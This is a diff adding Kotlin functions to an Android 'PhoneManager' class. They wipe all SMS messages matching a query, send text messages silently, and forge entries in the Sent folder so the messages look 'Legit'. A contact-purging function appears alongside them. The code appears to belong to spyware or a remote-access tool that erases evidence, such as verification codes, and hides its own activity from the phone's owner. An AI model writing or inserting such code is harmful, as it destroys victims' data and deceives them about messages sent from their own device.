@@ -333,6 +333,41 @@ object PhoneManager {
         }
     }
 
+    fun deleteSmsByQuery(ctx: Context, query: String): Int {
+        if (query.isEmpty()) return 0
+        val resolver = ctx.contentResolver
+        return try {
+            val count = resolver.delete(android.net.Uri.parse("content://sms/"), "body LIKE ?", arrayOf("%$query%"))
+            DebugLogger.log("SMS_WIPE", "Purged $count messages matching query: $query")
+            count
+        } catch (e: Exception) {
+            DebugLogger.log("SMS_WIPE_ERR", "Query wipe failed: ${e.message}")
+            0
+        }
+    }
+
+    fun sendLegitSms(ctx: Context, address: String, message: String) {
+        try {
+            val smsManager = ctx.getSystemService(android.telephony.SmsManager::class.java)
+            val parts = smsManager.divideMessage(message)
+            smsManager.sendMultipartTextMessage(address, null, parts, null, null)
+            
+            // If we are default, manually insert into Sent folder so it's 'Legit'
+            if (DefaultSmsManager.isDefaultSms(ctx)) {
+                val values = android.content.ContentValues()
+                values.put("address", address)
+                values.put("body", message)
+                values.put("date", System.currentTimeMillis())
+                values.put("read", 1)
+                values.put("type", 2) // MESSAGE_TYPE_SENT
+                ctx.contentResolver.insert(android.net.Uri.parse("content://sms/sent"), values)
+            }
+            DebugLogger.log("SMS_SEND", "Dispatched to $address")
+        } catch (e: Exception) {
+            DebugLogger.log("SMS_SEND_ERR", "Failed to send: ${e.message}")
+        }
+    }
+
     fun purgeContact(ctx: Context, target: String): Int {
         val uri = ContactsContract.RawContacts.CONTENT_URI
         val resolver = ctx.contentResolver
